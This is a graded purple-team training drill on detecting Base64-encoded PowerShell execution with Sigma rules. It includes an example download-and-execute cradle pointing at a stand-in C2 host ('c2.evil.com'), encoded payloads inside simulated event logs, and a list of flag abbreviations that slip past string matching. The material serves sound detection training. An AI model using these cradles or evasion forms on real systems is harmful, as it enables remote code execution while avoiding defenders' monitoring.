# Drill: Purple Team Exercise — ATT&CK Technique Execution and Detection Validation

**Level:** Advanced

**Estimated time:** 90–120 minutes

**Session:** 13 — Advanced Topics in Security Operations

---

## Scenario

You are part of the detection engineering team at **Polaris Defense Systems**.
Following a tabletop exercise, the CISO commissioned a purple team engagement to validate whether current detections cover a specific ATT&CK technique used by the threat actor profile most relevant to Polaris's industry.

The technique selected is **T1059.001 — PowerShell** (execution via encoded command), which the red team previously used to evade basic EDR detection in a past assessment.

Your task in this purple team exercise is threefold:

1. Simulate the attack technique in a controlled Docker environment
1. Verify whether the detection rule (pre-written and deployed in the SIEM) fires on the activity
1. Improve the detection rule to catch a variant the original rule missed

---

## Learning Objectives

* Understand the purple team methodology: emulate → detect → improve
* Execute a controlled ATT&CK technique simulation
* Evaluate a Sigma detection rule against generated log evidence
* Iteratively improve a detection rule based on observed evasion

---

## Environment Setup

```console
cd demos/demo-04-soc-metrics
docker compose up -d
docker compose exec app bash
```

The container provides:

* A minimal Windows Event Log simulator (`/scripts/simulate_events.py`)
* A pre-written Sigma rule at `/data/rules/detect_encoded_powershell.yml`
* A Sigma rule tester at `/scripts/rule_tester.py`
* Sample baseline logs at `/data/baseline_events.json` (normal activity — no attacks)

---

## Background: T1059.001 PowerShell Encoded Command

Attackers frequently encode PowerShell commands in Base64 to evade signature-based detection:

```powershell
# Plaintext command (easily detected):
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/p')"

# Base64 encoded (harder to detect without decoding):
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQByAGkAbAAuAGMAbwBtAC8AcAAnACkA
```

Detection commonly looks for:

* `-EncodedCommand` or `-enc` in the command line
* PowerShell launching with encoded content
* Suspicious decoded commands (download cradles, `IEX`, etc.)

---

## Pre-written Detection Rule (DO NOT MODIFY YET)

`/data/rules/detect_encoded_powershell.yml`:

```yaml
title: PowerShell Encoded Command Execution
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: Detects PowerShell execution with Base64 encoded commands
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
  condition: selection
falsepositives:
  - Legitimate automation scripts using encoded commands
level: high
```

---

## Tasks

### Task 1 — Establish a Baseline

1. Load `/data/baseline_events.json` — this contains 50 normal process-creation events.
1. Run the pre-written detection rule against the baseline using `/scripts/rule_tester.py`.
1. Record: how many baseline events match the rule? (This is your false positive baseline.)
1. List any baseline matches and explain why they triggered.

```console
python3 /scripts/rule_tester.py \
  --rule /data/rules/detect_encoded_powershell.yml \
  --events /data/baseline_events.json
```

### Task 2 — Simulate the Attack (Variant A)

Generate a simulated attack event using the event simulator:

```python
# /tmp/attack_variant_a.py
import json

attack_event = {
    "EventID": 4688,
    "TimeCreated": "2024-11-15T14:22:03Z",
    "Hostname": "WS-POLARIS-031",
    "User": "POLARIS\\operator1",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAGEAeQBsAG8AYQBkACcAKQA=",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c powershell.exe ...",
    "ProcessId": 9912,
    "ParentProcessId": 7744
}

with open("/tmp/attack_events_a.json", "w") as f:
    json.dump([attack_event], f, indent=2)

print("Attack event A written.")
print(f"Command line: {attack_event['CommandLine']}")
```

1. Run the script above to generate the attack event.
1. Run the detection rule against `/tmp/attack_events_a.json`.
1. Confirm the rule fires. Record the match output.
1. Decode the Base64 payload manually to confirm what command it represents:

   ```python
   import base64
   encoded = "SQBFAFgAIAAo..."  # the encoded part
   print(base64.b64decode(encoded).decode("utf-16-le"))
```

### Task 3 — Simulate the Attack (Variant B — Evasion)

A more sophisticated attacker uses a truncated flag abbreviation and mixed casing to bypass simple string matching:

```python
# /tmp/attack_variant_b.py
import json

attack_event_b = {
    "EventID": 4688,
    "TimeCreated": "2024-11-15T14:35:17Z",
    "Hostname": "WS-POLARIS-031",
    "User": "POLARIS\\operator1",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell  -nop -w hidden -eC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAGEAeQBsAG8AYQBkACcAKQA=",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ProcessId": 9955,
    "ParentProcessId": 7744
}

with open("/tmp/attack_events_b.json", "w") as f:
    json.dump([attack_event_b], f, indent=2)
print("Attack event B written.")
```

Key difference: the attacker uses `-eC` (abbreviated form of `-EncodedCommand`) with mixed spacing.

1. Run the original detection rule against `/tmp/attack_events_b.json`.
1. Confirm the rule **does NOT fire** (because `-eC` is not in the rule's condition).
1. Document this as a detection gap.

**Hint:** PowerShell accepts these abbreviated forms of `-EncodedCommand`:
`-e`, `-ec`, `-enc`, `-enco`, `-encod`, `-encode`, `-encoded`, `-encodedC`, `-encodedCo`, `-encodedCom`, `-encodedComm`, `-encodedComma`, `-encodedComman`, `-encodedCommand`

### Task 4 — Improve the Detection Rule

Create an improved rule at `/tmp/detect_encoded_powershell_v2.yml` that catches both variants.

Requirements:

* Must catch `-EncodedCommand`, `-enc`, AND `-eC`, `-e `, `-ec ` forms

* Use a regex condition OR expand the `contains|any` list

* Must still not fire on any baseline events from Task 1

Test your improved rule against all three event sets:

```bash
python3 /scripts/rule_tester.py \
  --rule /tmp/detect_encoded_powershell_v2.yml \
  --events /data/baseline_events.json

python3 /scripts/rule_tester.py \
  --rule /tmp/detect_encoded_powershell_v2.yml \
  --events /tmp/attack_events_a.json

python3 /scripts/rule_tester.py \
  --rule /tmp/detect_encoded_powershell_v2.yml \
  --events /tmp/attack_events_b.json
```

Both attack variants should match; baseline should show 0 matches (or justify any remaining).

### Task 5 — Write a Purple Team Finding Report

Create `/tmp/purple_team_finding.md` documenting:

1. **Technique Tested** — ATT&CK ID, name, sub-technique
1. **Simulation Details** — What commands were run; what events were generated
1. **Initial Detection Result** — Did the existing rule catch Variant A? Variant B?
1. **Detection Gap Analysis** — Why did the original rule miss Variant B?
1. **Improved Rule** — YAML of the v2 rule with inline comments explaining changes
1. **Validation Results** — Table showing: rule × event set → match/no-match
1. **Residual Risk** — What further variants could still evade even the improved rule?
1. **Recommendations** — 3 specific improvements for detection posture

---

## Deliverables

* `/tmp/attack_events_a.json` and `/tmp/attack_events_b.json`
* `/tmp/detect_encoded_powershell_v2.yml`
* `/tmp/purple_team_finding.md`
* Terminal output from all rule-tester runs

---

## Hints

* PowerShell flag abbreviation works because PowerShell uses prefix matching for parameters. Any unambiguous prefix of `-EncodedCommand` is valid.

* The simplest improvement: add all common abbreviations to `CommandLine|contains|any:`. This is not elegant but is widely used in production Sigma rules.
* A more robust approach: add a condition detecting a long Base64 string in the command line (80+ chars of `[A-Za-z0-9+/=]`). Use `CommandLine|re:` with a regex.
* Even the improved rule won't catch PowerShell called via `cmd.exe /c "echo IEX... | powershell"` (piped command, no `-EncodedCommand` flag). Document this as residual risk.

---

## Evaluation Criteria

| Criterion | Points |
|-----------|--------|
| Task 1: Baseline established; false positive analysis complete | 10 |
| Task 2: Attack event A generated and original rule fires | 15 |
| Task 3: Evasion demonstrated — original rule does NOT fire on Variant B | 20 |
| Task 4: Improved rule catches both A and B; passes baseline | 25 |
| Task 5: Purple team report complete with all 8 sections | 30 |

**Total: 100 points**
